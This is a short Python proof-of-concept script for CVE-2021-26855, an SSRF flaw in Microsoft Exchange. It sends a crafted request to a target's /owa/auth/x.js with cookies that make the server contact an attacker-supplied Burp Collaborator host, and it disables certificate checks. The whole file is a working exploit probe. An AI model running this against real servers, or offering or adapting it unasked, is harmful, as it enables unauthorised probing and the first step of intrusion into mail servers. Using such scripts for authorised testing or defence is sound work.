from argparse import ArgumentParser
import requests,sys

parser= ArgumentParser(description="CVE-2021-26855 SSRF POC", epilog='CVE-2021-26855.py -H targetdomai.com -b burpcollab.net')
rparser = parser.add_argument_group('required argument')
rparser.add_argument('-H', '--host',type=str, help='target domain',required=True)
rparser.add_argument('-B', '--burpcollab', type=str, help='Collabrator Client', required=True )
args= parser.parse_args()
def main():
  print(args.host)
  print(args.burpcollab)
  baseurl = 'https://'+ args.host+'/owa/auth/x.js'
  rheaders= {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0'
  }

  cookie= {'X-AnonResource':'true',
  'X-AnonResource-Backend': args.burpcollab +'/ecp/default.flt?~3',
  'X-BEResource':'localhost/owa/auth/logon.aspx?~3'
  } 

  rget = requests.get(baseurl, headers=rheaders, cookies=cookie ,verify=False)
  print(rget)

main()